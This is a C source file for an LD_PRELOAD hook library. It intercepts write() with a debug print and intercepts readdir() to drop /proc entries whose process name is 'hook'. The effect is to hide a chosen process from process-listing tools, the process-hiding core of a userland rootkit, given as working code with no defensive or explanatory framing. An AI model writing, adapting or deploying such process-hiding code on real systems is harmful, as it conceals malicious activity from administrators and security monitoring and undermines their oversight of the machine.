#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
//ssize_t write(int fildes, const void *buf, size_t nbyte);
ssize_t (*real_write)(int, const void *, size_t) = NULL;


ssize_t write(int fildes, const void *buf, size_t nbyte){
    if(real_write == NULL)
        real_write = dlsym(RTLD_NEXT, "write");//get the real write function address

    printf("Oops, in hook func write\n");

    return real_write(fildes, buf, nbyte);
}

int process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[2560];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);

    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

//process need hide
char * process_need_hide = "hook";

struct dirent* (*real_readdir)(DIR *dirp) = NULL;

//hook readir
struct dirent *readdir(DIR *dirp) {
    if(dirp == NULL)
        return NULL;
    if(real_readdir == NULL) {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    if(real_readdir == NULL)
    {
        printf("Oops, hook readdir error\n");
        return NULL;
    }
    printf("Oops, hook readdir\n");
    struct dirent *dir = real_readdir(dirp);
    char proc_name[1280] = {0};
    if(dir != NULL &&
            process_name(dir->d_name, proc_name) &&
            strcmp(proc_name, process_need_hide)==0)
    {
        printf("readdir skip:%s\n", proc_name);
        //skip to next dir
        dir = real_readdir(dirp);
    }
    return dir;
}

